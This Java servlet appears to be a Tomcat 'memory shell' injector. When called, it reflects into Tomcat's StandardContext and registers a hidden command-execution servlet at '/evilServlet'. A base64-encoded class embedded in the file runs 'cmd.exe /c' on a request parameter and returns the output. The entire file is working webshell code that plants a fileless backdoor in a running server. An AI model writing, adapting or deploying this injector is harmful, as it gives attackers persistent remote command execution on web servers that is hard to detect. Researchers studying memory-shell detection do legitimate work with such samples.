package com.servlet;

import com.filter.DynamicUtils;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;

import javax.servlet.Servlet;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Field;

public class AddServletShell extends HttpServlet {
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        String servletName = "mytest";

        ServletContext servletContext = request.getServletContext();


        try {


            if (servletContext.getServletRegistration(servletName) == null) {
                StandardContext standardContext = null;
                while (standardContext == null) {
                    Field f = servletContext.getClass().getDeclaredField("context");
                    f.setAccessible(true);
                    Object obj = f.get(servletContext);

                    if(obj instanceof ServletContext){
                        servletContext = (ServletContext) obj;
                    }

                    if(obj instanceof StandardContext){
                        standardContext = (StandardContext) obj;
                    }

                }

                /*
                * 自定义可命令执行servlet，可见CMDServlet
                * */

                String servletClassB = "yv66vgAAADMAbwoAFwA3CAA4CwA5ADoHADsIADwIAD0KAD4APwoAPgBACgBBAEIHAEMKAAoARAgARQoACgBGCgAKAEcKAAoASAgASQsASgBLCgBMAE0KAEwATggATwgAUAcAUQcAUgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAYTGNvbS9zZXJ2bGV0L0NNRFNlcnZsZXQ7AQAFZG9HZXQBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAC2lucHV0U3RyZWFtAQAVTGphdmEvaW8vSW5wdXRTdHJlYW07AQAHc2Nhbm5lcgEAE0xqYXZhL3V0aWwvU2Nhbm5lcjsBAAZvdXRwdXQBABJMamF2YS9sYW5nL1N0cmluZzsBAANyZXEBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAARyZXNwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEADVN0YWNrTWFwVGFibGUHACIHAFMHAEMHADsBAApFeGNlcHRpb25zBwBUBwBVAQAKU291cmNlRmlsZQEAD0NNRFNlcnZsZXQuamF2YQwAGAAZAQABYwcAVgwAVwBYAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwcAWQwAWgBbDABcAF0HAF4MAF8AYAEAEWphdmEvdXRpbC9TY2FubmVyDAAYAGEBAAJcYQwAYgBjDABkAGUMAGYAZwEAAAcAaAwAaQBqBwBrDABsAG0MAG4AGQEAEgpteSBjdXN0b20gc2VydmxldAEABAplbmQBABZjb20vc2VydmxldC9DTURTZXJ2bGV0AQAeamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0AQATamF2YS9pby9JbnB1dFN0cmVhbQEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gAIQAWABcAAAAAAAIAAQAYABkAAQAaAAAALwABAAEAAAAFKrcAAbEAAAACABsAAAAGAAEAAAALABwAAAAMAAEAAAAFAB0AHgAAAAQAHwAgAAIAGgAAATIABQAHAAAAiSsSArkAAwIAxgBhBr0ABFkDEgVTWQQSBlNZBSsSArkAAwIAU064AActtgAItgAJOgS7AApZGQS3AAsSDLYADToFGQW2AA6ZAAsZBbYAD6cABRIQOgYsuQARAQAZBrYAEiy5ABEBALYAEyy5ABEBABIUtgASLLkAEQEAEhW2ABIsuQARAQC2ABOxAAAAAwAbAAAALgALAAAADgALAA8AJQAQADEAEQBBABIAVQATAGAAFABpABYAdAAXAH8AGACIABkAHAAAAEgABwAlAEQAIQAiAAMAMQA4ACMAJAAEAEEAKAAlACYABQBVABQAJwAoAAYAAACJAB0AHgAAAAAAiQApACoAAQAAAIkAKwAsAAIALQAAABUAA/4AUQcALgcALwcAMEEHADH4ABUAMgAAAAYAAgAzADQAAQA1AAAAAgA2";

//                Class<?> servletClass = DynamicUtils.getClass(DynamicUtils.SERVLET_CLASS_STRING);
//                Class<?> servletClass = DynamicUtils.getClass(servletClassB);
                Class<?> servletClass = CMDServlet.class;
                Wrapper wrapper = standardContext.createWrapper();
                wrapper.setName(servletName);
                wrapper.setLoadOnStartup(1);
                wrapper.setServlet((Servlet) servletClass.newInstance());
                wrapper.setServletClass(servletClass.getName());

                standardContext.addChild(wrapper);

                standardContext.addServletMappingDecoded("/evilServlet",servletName);

                response.getWriter().write("add servlet okok");
            }
        } catch (Exception e) {

        }

    }
}
